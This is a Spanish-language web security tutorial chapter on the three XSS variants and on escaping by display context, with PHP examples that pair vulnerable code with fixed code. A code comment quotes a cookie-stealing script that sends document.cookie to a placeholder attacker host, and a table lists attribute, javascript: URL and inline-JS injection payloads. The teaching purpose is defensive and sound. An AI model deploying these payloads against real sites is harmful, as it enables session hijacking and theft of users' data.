---
order: 11
---

# XSS: reflected, stored y DOM-based

El principio del XSS (*Cross-Site Scripting*) ya se plantea en [Asegurar tus datos](/?c=langages&s=php&p=securite) (`htmlspecialchars()`, caso *reflected*) y en [Crear y manipular elementos](/?c=langages&s=javascript&p=html-elements) (`innerHTML` frente a `textContent`, caso *DOM-based*). Este capítulo no repite esos mecanismos: plantea la distinción entre las tres variantes (lo que realmente cambia entre ellas), y luego cubre lo que aún falta: el almacenamiento en base de datos (*stored*) y el escapado según el CONTEXTO de visualización.

## Las tres variantes: dónde vive el dato trampa antes de mostrarse

La diferencia entre las tres se reduce a UN solo punto: dónde permanece el dato malicioso antes de terminar ejecutado en el navegador de la víctima.

```text
REFLECTED (ya visto: htmlspecialchars)
  La victima envia una peticion trampa --> El servidor la devuelve TAL CUAL en su respuesta --> El navegador la ejecuta
  (el dato solo hace un ida y vuelta, nunca se almacena)

STORED (nuevo en este capitulo)
  Atacante --> Dato trampa guardado en la base de datos (comentario, apodo, resena...)
                          |
                          v
  CUALQUIER victima que consulte esta pagina despues --> ejecuta el payload
  (el dato permanece almacenado: una sola inyeccion afecta a todos los visitantes futuros)

DOM-BASED (ya visto: innerHTML frente a textContent)
  Dato trampa leido directamente por JavaScript del lado del NAVEGADOR (ej.: un parametro de URL)
  --> nunca devuelto por el servidor, nunca almacenado: todo ocurre en el navegador de la victima
```

| Variante | Dónde transita el dato | Quién se ve afectado | Ya cubierto |
|---|---|---|---|
| Reflected | Petición → respuesta del servidor, de inmediato | Solo la víctima que hace clic en un enlace trampa | [`htmlspecialchars()`](/?c=langages&s=php&p=securite) |
| Stored | Base de datos, entre dos visitas | Cualquier visitante de la página afectada, sin acción trampa de su parte | Sección siguiente |
| DOM-based | Nunca devuelto por el servidor, leído en JS del lado del navegador | La víctima, a través de un dato que SU PROPIO navegador lee (URL, `localStorage`...) | [`innerHTML` frente a `textContent`](/?c=langages&s=javascript&p=html-elements) |

## Stored XSS: la variante que ya no depende de la víctima

Un formulario de comentarios, un apodo, una reseña de cliente: cualquier dato de usuario GUARDADO y luego vuelto a mostrar a otros visitantes es un objetivo stored si no se escapa al mostrarlo.

```php
// Guardado (sin riesgo aquí por si mismo: solo almacenamos texto)
$pdo->prepare("INSERT INTO comentarios (texto) VALUES (?)")->execute([$comentario]);

// PELIGROSO: se vuelve a mostrar después, sin escapado
foreach ($comentarios as $c) {
    // si un atacante publico
    // <script>document.location='https://robo.example/?c='+document.cookie</script>,
    echo $c['texto'];
                        // ESTE Código SE EJECUTA para CADA visitante que ve este comentario
}

// SEGURO: mismo reflejo que en reflected, aplicado en el momento de MOSTRAR, no de guardar
foreach ($comentarios as $c) {
    echo htmlspecialchars($c['texto']);
}
```

> **Trampa:** escapar el dato al GUARDARLO en lugar de al MOSTRARLO. Parece intuitivo ("limpio la entrada una sola vez para siempre"), pero falla en cuanto el mismo dato se vuelve a mostrar en un contexto diferente (una página HTML, una exportación CSV, una notificación por email) que no necesita el mismo escapado (véanse los contextos abajo). El escapado siempre se hace justo antes de mostrar, nunca antes de almacenar.

## El escapado depende del CONTEXTO de visualización, no solo del texto

`htmlspecialchars()` protege un dato insertado en el CUERPO de una página HTML. El mismo reflejo aplicado en otro contexto no protege contra el mismo riesgo:

| Contexto de inserción | Ejemplo de payload peligroso | Protección adecuada |
|---|---|---|
| Cuerpo HTML (texto entre dos etiquetas) | `<script>...</script>` | `htmlspecialchars()` (ya visto) |
| Atributo HTML (`<input value="...">`) | `" onmouseover="alert(1)` (cierra el atributo, añade uno nuevo) | Rodear siempre el atributo con comillas Y aplicarle `htmlspecialchars()` (que también escapa `"`) |
| URL (`<a href="...">`) | `javascript:alert(document.cookie)` como valor de URL | Verificar que la URL empiece por un protocolo permitido (`http://`, `https://`) antes de insertarla |
| JavaScript inline (`<script>var x = "...";</script>`) | `"; alert(1); //` (cierra la cadena JS, añade una instrucción) | Nunca insertar un dato de usuario directamente en JavaScript inline: pasarlo mediante un atributo `data-*` leído después del lado JS, o mediante JSON con un escapado dedicado a este contexto |

> **Buena práctica:** identificar el contexto exacto de inserción (cuerpo de texto, atributo, URL, JS) antes de elegir el escapado, en lugar de aplicar `htmlspecialchars()` por reflejo en todas partes suponiendo que siempre basta.

---

## 📋 Resumen

| | |
|---|---|
| **Para recordar** | Las tres variantes de XSS se distinguen por dónde vive el dato trampa antes de ejecutarse: ida y vuelta inmediata (reflected), almacenado en base de datos y repetido en cada visita (stored), o nunca devuelto por el servidor y leído directamente en JS del lado del navegador (DOM-based). El escapado correcto depende del contexto de inserción (cuerpo HTML, atributo, URL, JS inline), no solo de la presencia de un dato de usuario. |
| **Herramientas utilizables** | `htmlspecialchars()` para el cuerpo HTML y los atributos; verificación de protocolo para una URL; `data-*` + lectura JS para un dato destinado a JavaScript. |
| **Trampas a evitar** | Escapar un dato al guardarlo en lugar de al mostrarlo; aplicar el mismo escapado sin importar el contexto de inserción. |
| **Buenas prácticas** | Escapar sistemáticamente en el momento de mostrar, nunca antes; adaptar el escapado al contexto exacto (HTML/atributo/URL/JS). |
